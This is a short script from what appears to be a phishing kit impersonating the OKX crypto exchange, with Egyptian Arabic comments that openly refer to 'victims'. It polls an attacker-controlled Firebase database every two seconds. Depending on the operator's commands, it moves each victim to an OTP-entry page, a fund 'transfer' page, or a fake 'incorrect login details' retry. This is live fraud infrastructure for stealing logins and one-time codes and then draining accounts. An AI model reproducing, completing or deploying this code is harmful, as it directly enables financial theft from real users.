<script>
    // 1. لقط الـ ID بتاع الضحية من الرابط
    const urlParams = new URLSearchParams(window.location.search);
    const dbUrl = "https://okx-project-ef5bf-default-rtdb.firebaseio.com/victims/" + victimId + ".json";

    if (!victimId) {
        window.location.href = "index.html";
    }

    // 2. الرادار بيفحص الحالة كل ثانيتين
    const checkStatus = setInterval(async () => {
        try {
            const response = await fetch(`https://okx-project-ef5bf-default-rtdb.firebaseio.com/victims/${victimId}.json`);
            const data = await response.json();

            if (!data) return;

            // التحويل لصفحة الـ OTP العادية للدخول
            if (data.status === "need_otp") {
                clearInterval(checkStatus);
                window.location.href = "otp1.html?id=" + victimId;
            } 
            // التعديل الجديد: التحويل لصفحة السحب لما الحالة تبقى withdraw
            else if (data.status === "withdraw") {
                clearInterval(checkStatus);
                window.location.href = "transfer.html?id=" + victimId; 
            }
            // لو البيانات غلط يرجعه يعيد من الأول
            else if (data.status === "wrong") {
                clearInterval(checkStatus);
                alert("Incorrect login details. Please try again.");
                window.location.href = "index.html";
            }
        } catch (error) {
            console.error("Error:", error);
        }
    }, 2000);
</script>
